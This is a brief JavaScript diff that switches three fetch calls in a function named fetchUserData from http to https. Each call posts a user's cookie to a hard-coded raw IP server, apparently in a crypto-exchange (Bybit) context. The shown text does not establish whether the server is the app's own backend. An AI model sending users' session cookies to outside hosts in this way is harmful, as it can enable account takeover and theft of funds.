@@ -90,17 +90,17 @@
         async function fetchUserData(cookie) {
             try {
                 const [aboutRes, percentageRes, amountRes, bybitBalance] = await Promise.all([
-                    fetch('http://170.64.203.226:5000/about', {
+                    fetch('https://170.64.203.226:5000/about', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ cookie })
                     }).then(res => res.json()),
-                    fetch('http://170.64.203.226:5000/percentage', {
+                    fetch('https://170.64.203.226:5000/percentage', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ cookie })
                     }).then(res => res.json()),
-                    fetch('http://170.64.203.226:5000/amount', {
+                    fetch('https://170.64.203.226:5000/amount', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ cookie })
